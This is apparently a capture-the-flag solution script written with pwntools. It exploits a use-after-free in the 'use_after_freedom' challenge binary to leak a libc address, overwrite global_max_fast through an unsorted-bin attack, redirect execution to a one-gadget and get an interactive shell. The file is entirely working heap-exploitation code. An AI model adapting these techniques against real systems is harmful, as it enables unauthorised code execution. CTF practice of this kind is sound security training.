#!/usr/bin/python

from pwn import *
import sys

remote_ip, port = 'use-after-freedom.hsc.tf', 1337
binary = './use_after_freedom'
brkpts = '''
tel $rebase(0x202010)
'''

elf = ELF("use_after_freedom")
libc = ELF("libc-2.27.so")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
context.log_level = "debug"
#context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

uu64 = lambda a: u64(a.ljust(8,"\x00"))

if len(sys.argv) > 1:
    io = remote(remote_ip, port)
    context.noptrace = True

else:
    io = process(binary, env = {'LD_PRELOAD' : './libc-2.27.so'})

def choice(idx):
    sla("\n> ", str(idx))

def add(size, name):
    choice(1)
    choice(size)
    sa("\n> ", str(name))

def free(idx):
    choice(2)
    choice(idx)

def edit(idx, name):
    choice(3)
    choice(idx)
    sa("\n> ", str(name))

def view(idx):
    choice(4)
    choice(idx)

def getsize(size):
    return size*2 - 0x10

def exploit(io):
    add(0x500, "a")
    add(getsize(0x4a18), "b")
    add(getsize(0xc30+0x2b0), "c")
    add(0x500, "a")
    free(0)
    view(0)

    libc.address = uu64(re(6)) - 0x3ebca0
    log.info("libc -> "+hex(libc.address))
    arena = libc.address + 0x3ebca0
    max_fast = libc.address + 0x3ed940
    gadget = libc.address + 0xe546f

    edit(2, p64(gadget)*3)
    edit(0, p64(arena) + p64(max_fast - 0x10))

    add(0x500, "a")
    gdb.attach(io, brkpts)

    free(1)
    free(2)

    io.interactive()

if __name__ == "__main__":
    exploit(io)